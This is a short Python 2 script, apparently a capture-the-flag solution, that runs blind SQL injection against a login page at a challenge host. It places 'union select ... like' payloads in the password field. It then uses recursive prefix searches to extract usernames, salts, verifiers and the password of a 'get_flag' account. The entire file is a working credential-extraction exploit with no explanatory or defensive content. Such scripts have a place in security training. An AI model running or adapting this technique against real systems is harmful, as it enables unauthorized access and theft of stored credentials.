import requests, string

def sql(user, password):
    print password
    r=requests.post("http://tonnerre.pwning.xxx:8560/login.php",
            data={"username":user,"password":password})
    res=r.text
    print res
    if res.find("unsuccessful")>-1:
        return False
    return True

def check_user(prefix):
    return sql("abcdef", 
            "' union select user from users where user like '"+
            prefix+"%' # ")

def check_user_password(user, prefix):
    return sql("abcdef", 
            "' union select user from users where user='"+user+"' and salt like '"+
            prefix+"%' # ")

def check_user_pass(user, prefix):
    return sql("abcdef", 
            "' union select user from users where user='"+user+"' and pass like '"+
            prefix+"%' # ")

def check_user_verifier(user, prefix):
    return sql("abcdef", 
            "' union select user from users where user='"+user+"' and verifier like '"+
            prefix+"%' # ")

users=[]
def dfs(prefix):
    ok=False
    for c in string.lowercase+"_":
        pref=prefix+c
        if check_user(pref):
            dfs(pref)
            ok=True
    if not ok:
        users.append(prefix)

# dfs("")

user="get_flag"
def dfs2(prefix):
    ok=False
    for c in "abcdef0123456789":
        pref=prefix+c
        if check_user_password(user, pref):
            dfs2(pref)
            ok=True
    if not ok:
        print prefix

# dfs2("")
def dfs3(prefix):
    ok=False
    for c in "abcdef0123456789":
        pref=prefix+c
        if check_user_verifier(user, pref):
            dfs3(pref)
            ok=True
    if not ok:
        print prefix

def dfs4(prefix):
    ok=False
    for c in string.lowercase+string.digits:
        pref=prefix+c
        if check_user_pass(user, pref):
            dfs4(pref)
            ok=True
    if not ok:
        print prefix
dfs4("")
